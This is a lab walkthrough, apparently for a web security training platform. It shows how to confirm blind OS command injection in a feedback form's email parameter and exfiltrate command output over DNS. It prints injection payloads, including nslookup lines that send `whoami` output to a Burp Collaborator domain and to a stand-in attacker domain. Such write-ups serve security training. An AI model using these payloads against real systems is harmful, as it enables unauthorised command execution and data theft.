# Blind OS command injection with out-of-band data exfiltration

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3cf01424-4157-4060-9e62-40874da27ca0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TMACMVIH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFS0qGc%2F%2BLf%2BzgHaabp05OjPVdruFEg%2F6HiKZbGe0CQXAiBPETZjGLuyw6iKOi8LmxrApYanGim6mqitLXpWo1CLWyqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM2g0R5bQCFuPgoonPKtwDk9XZG2nkVHiHQhr5AtW3JzyT5hEey1e9lwS2iTB6akW1ib1%2F5q0xtVVlapYu0nthhNTE8G2JcEeuBmDDrWrbgrfzSeaHXJA9Sk7Aw7coMdm6n9Drz7SFKRgfLnaK0llo0MnCNiF%2FyKDKOlr8cwOcLVrLvJjRPkpcZ3DCGN72O42zCg01%2BKmffhKHp2AxMkEkxQr0PvWT%2BQgDuTNH2Xr27FT%2FqHrbNhf5GwaI6P6B2xDY7QsrsngIhoX0Cbtaolr2keGSRslnQBjNzBT0hILYSuqhP%2FSxk2pJE4A4qdbq0TorA5oE9TNDprP%2F7GszAFYvPD14pXbpaOxgaqaOseoJ72N8B4Abw%2BO7CXZC8aDillC35CQv2vGrMetzjrjkIt1VExGYJ52ZBH6wt197bR4gUOq4EzNLccf6QKPcglU00tBBfvSwUiq%2BSBla35Tu%2Bb%2BqJ5tgz%2Bkdwt6rlHF70iJTnsITAHf5tkxvT%2FHNiXVkmyCewPZYRvyBo4Pcq8nYnINu6OGcsBxDlEQkqAn7X3Ul1HkFm0hnIaPizJsJko1hnDeqLzX980HIOmGY5Nx4fFWuhXFcZc9p9lkmo1WkU9UcpgZvOz38FiWSj9sNeyrT2JQ5S8GhfbrMY4MtC1sw4sii1AY6pgG11luJ6S4vKpwHG2tZJryV6%2FvFpD7ZwEgPh722UHxWhXmM7rsn03OE7aNBcExU1vTchpA5uFbibg6IPp%2FLgVmvFJwarGE7pDS3OK6NmwqDjMdkT5IxiPcD4BQqlUXAyIj6l1c%2BtQ3f2FtSOT2ua1BvyTO%2BFqk6ruVc0fPAxCyFmhZxk9%2B3ACOM%2BsbWoWx%2B1VU5iBisEj1TTAcZb2RHbH2JCvnQIVMK&X-Amz-Signature=5a7f28bb07411f8516be97e727941f146804bd71c13a172b330be42f940ce4f8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup 8mvkjln6evqts94q7vwt31eziqoic90y.oastify.com;#
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/920c3740-dd8c-4461-923c-60ef01a5914b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TMACMVIH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFS0qGc%2F%2BLf%2BzgHaabp05OjPVdruFEg%2F6HiKZbGe0CQXAiBPETZjGLuyw6iKOi8LmxrApYanGim6mqitLXpWo1CLWyqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM2g0R5bQCFuPgoonPKtwDk9XZG2nkVHiHQhr5AtW3JzyT5hEey1e9lwS2iTB6akW1ib1%2F5q0xtVVlapYu0nthhNTE8G2JcEeuBmDDrWrbgrfzSeaHXJA9Sk7Aw7coMdm6n9Drz7SFKRgfLnaK0llo0MnCNiF%2FyKDKOlr8cwOcLVrLvJjRPkpcZ3DCGN72O42zCg01%2BKmffhKHp2AxMkEkxQr0PvWT%2BQgDuTNH2Xr27FT%2FqHrbNhf5GwaI6P6B2xDY7QsrsngIhoX0Cbtaolr2keGSRslnQBjNzBT0hILYSuqhP%2FSxk2pJE4A4qdbq0TorA5oE9TNDprP%2F7GszAFYvPD14pXbpaOxgaqaOseoJ72N8B4Abw%2BO7CXZC8aDillC35CQv2vGrMetzjrjkIt1VExGYJ52ZBH6wt197bR4gUOq4EzNLccf6QKPcglU00tBBfvSwUiq%2BSBla35Tu%2Bb%2BqJ5tgz%2Bkdwt6rlHF70iJTnsITAHf5tkxvT%2FHNiXVkmyCewPZYRvyBo4Pcq8nYnINu6OGcsBxDlEQkqAn7X3Ul1HkFm0hnIaPizJsJko1hnDeqLzX980HIOmGY5Nx4fFWuhXFcZc9p9lkmo1WkU9UcpgZvOz38FiWSj9sNeyrT2JQ5S8GhfbrMY4MtC1sw4sii1AY6pgG11luJ6S4vKpwHG2tZJryV6%2FvFpD7ZwEgPh722UHxWhXmM7rsn03OE7aNBcExU1vTchpA5uFbibg6IPp%2FLgVmvFJwarGE7pDS3OK6NmwqDjMdkT5IxiPcD4BQqlUXAyIj6l1c%2BtQ3f2FtSOT2ua1BvyTO%2BFqk6ruVc0fPAxCyFmhZxk9%2B3ACOM%2BsbWoWx%2B1VU5iBisEj1TTAcZb2RHbH2JCvnQIVMK&X-Amz-Signature=a4240ad74e8624a82b08b1789e8b48dacad85f248ee4ec9fe955eb7c88b5f6c1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

Once we’ve confirmed blind OS command injection, we can exfiltrate the output from injected commands using OAST techniques:

> 💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

Add the output of `whoami` as subdomain to the domain name provided but Burp Collaborator and send the request. URLencode the payload to avoid breaking the request.

```bash
; nslookup `whoami`.8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
or
; nslookup $(whoami).8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0ede8f97-e945-4d3d-a9af-76c2069b3801/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TMACMVIH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFS0qGc%2F%2BLf%2BzgHaabp05OjPVdruFEg%2F6HiKZbGe0CQXAiBPETZjGLuyw6iKOi8LmxrApYanGim6mqitLXpWo1CLWyqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM2g0R5bQCFuPgoonPKtwDk9XZG2nkVHiHQhr5AtW3JzyT5hEey1e9lwS2iTB6akW1ib1%2F5q0xtVVlapYu0nthhNTE8G2JcEeuBmDDrWrbgrfzSeaHXJA9Sk7Aw7coMdm6n9Drz7SFKRgfLnaK0llo0MnCNiF%2FyKDKOlr8cwOcLVrLvJjRPkpcZ3DCGN72O42zCg01%2BKmffhKHp2AxMkEkxQr0PvWT%2BQgDuTNH2Xr27FT%2FqHrbNhf5GwaI6P6B2xDY7QsrsngIhoX0Cbtaolr2keGSRslnQBjNzBT0hILYSuqhP%2FSxk2pJE4A4qdbq0TorA5oE9TNDprP%2F7GszAFYvPD14pXbpaOxgaqaOseoJ72N8B4Abw%2BO7CXZC8aDillC35CQv2vGrMetzjrjkIt1VExGYJ52ZBH6wt197bR4gUOq4EzNLccf6QKPcglU00tBBfvSwUiq%2BSBla35Tu%2Bb%2BqJ5tgz%2Bkdwt6rlHF70iJTnsITAHf5tkxvT%2FHNiXVkmyCewPZYRvyBo4Pcq8nYnINu6OGcsBxDlEQkqAn7X3Ul1HkFm0hnIaPizJsJko1hnDeqLzX980HIOmGY5Nx4fFWuhXFcZc9p9lkmo1WkU9UcpgZvOz38FiWSj9sNeyrT2JQ5S8GhfbrMY4MtC1sw4sii1AY6pgG11luJ6S4vKpwHG2tZJryV6%2FvFpD7ZwEgPh722UHxWhXmM7rsn03OE7aNBcExU1vTchpA5uFbibg6IPp%2FLgVmvFJwarGE7pDS3OK6NmwqDjMdkT5IxiPcD4BQqlUXAyIj6l1c%2BtQ3f2FtSOT2ua1BvyTO%2BFqk6ruVc0fPAxCyFmhZxk9%2B3ACOM%2BsbWoWx%2B1VU5iBisEj1TTAcZb2RHbH2JCvnQIVMK&X-Amz-Signature=30264111426efabe1b8bc99727779a5cee5a62e7107c7d1344abfc911ce7c9ca&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

The username is shown in the DNS request:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/91b1cdca-b79b-4600-b61a-bbb70e358201/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TMACMVIH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFS0qGc%2F%2BLf%2BzgHaabp05OjPVdruFEg%2F6HiKZbGe0CQXAiBPETZjGLuyw6iKOi8LmxrApYanGim6mqitLXpWo1CLWyqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM2g0R5bQCFuPgoonPKtwDk9XZG2nkVHiHQhr5AtW3JzyT5hEey1e9lwS2iTB6akW1ib1%2F5q0xtVVlapYu0nthhNTE8G2JcEeuBmDDrWrbgrfzSeaHXJA9Sk7Aw7coMdm6n9Drz7SFKRgfLnaK0llo0MnCNiF%2FyKDKOlr8cwOcLVrLvJjRPkpcZ3DCGN72O42zCg01%2BKmffhKHp2AxMkEkxQr0PvWT%2BQgDuTNH2Xr27FT%2FqHrbNhf5GwaI6P6B2xDY7QsrsngIhoX0Cbtaolr2keGSRslnQBjNzBT0hILYSuqhP%2FSxk2pJE4A4qdbq0TorA5oE9TNDprP%2F7GszAFYvPD14pXbpaOxgaqaOseoJ72N8B4Abw%2BO7CXZC8aDillC35CQv2vGrMetzjrjkIt1VExGYJ52ZBH6wt197bR4gUOq4EzNLccf6QKPcglU00tBBfvSwUiq%2BSBla35Tu%2Bb%2BqJ5tgz%2Bkdwt6rlHF70iJTnsITAHf5tkxvT%2FHNiXVkmyCewPZYRvyBo4Pcq8nYnINu6OGcsBxDlEQkqAn7X3Ul1HkFm0hnIaPizJsJko1hnDeqLzX980HIOmGY5Nx4fFWuhXFcZc9p9lkmo1WkU9UcpgZvOz38FiWSj9sNeyrT2JQ5S8GhfbrMY4MtC1sw4sii1AY6pgG11luJ6S4vKpwHG2tZJryV6%2FvFpD7ZwEgPh722UHxWhXmM7rsn03OE7aNBcExU1vTchpA5uFbibg6IPp%2FLgVmvFJwarGE7pDS3OK6NmwqDjMdkT5IxiPcD4BQqlUXAyIj6l1c%2BtQ3f2FtSOT2ua1BvyTO%2BFqk6ruVc0fPAxCyFmhZxk9%2B3ACOM%2BsbWoWx%2B1VU5iBisEj1TTAcZb2RHbH2JCvnQIVMK&X-Amz-Signature=e931f5f44d9d036a7d18d1f9d3f1978dc6d6762e4198fc9de7dd1fbd83ae7caa&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


